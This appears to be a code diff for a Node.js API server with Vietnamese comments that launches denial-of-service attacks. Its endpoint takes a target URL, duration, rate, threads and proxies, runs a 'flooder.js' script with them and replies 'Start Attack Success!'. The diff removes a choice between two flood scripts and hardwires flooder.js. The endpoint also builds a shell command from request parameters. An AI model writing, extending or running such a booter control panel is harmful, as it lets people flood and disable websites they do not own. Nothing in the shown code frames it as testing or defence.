@@ -19,7 +19,7 @@ const isValidUrl = (url) => urlRegex.test(url) && !blackList.some(char => url.in
 const isValidNumber = (value, max = Infinity) => !isNaN(value) && value >= 0 && value <= max;
 
 app.get(`/api`, async (req, res) => {
-    const { url, time, rate, thea, proxy, api_key: apiKey, server } = req.query;
+    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;
 
     // Kiểm tra API key
     if (apiKey !== api_key) {
@@ -32,22 +32,18 @@ app.get(`/api`, async (req, res) => {
     if (!isValidNumber(rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
     if (!isValidNumber(thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
     if (!proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
-    if (!['1', '2'].includes(server)) return res.json({ status: 500, data: `Server không hợp lệ, chỉ chấp nhận 1 hoặc 2` });
 
-    // Chọn file script theo server
-    const script = server === '1' ? 'flooder.js' : 'tls.js';
+    // Ghi log URL, thời gian, rate và threading
+    console.log(`Url: ${url} Time: ${time} Rate: ${rate} Threading: ${thea} đang thực hiện Start Attack`);
 
-    // Ghi log URL, thời gian, rate, threading và server
-    console.log(`Url: ${url}, Time: ${time}, Rate: ${rate}, Threading: ${thea}, Server: ${server} đang thực hiện Start Attack`);
-
-    // Chuẩn bị lệnh gọi tệp tương ứng
-    const command = `node ${script} ${url} ${time} ${rate} ${thea} ${proxy}`;
+    // Chuẩn bị lệnh gọi tệp flooder.js
+    const command = `node flooder.js ${url} ${time} ${rate} ${thea} ${proxy}`;
 
     // Gửi phản hồi trạng thái ban đầu ngay lập tức
     res.json({
         status: 200,
         message: 'Start Attack Success!',
-        data: { url, time, rate, thea, proxy, server }
+        data: { url, time, rate, thea, proxy }
     });
 
     // Thực thi lệnh sau khi gửi phản hồi
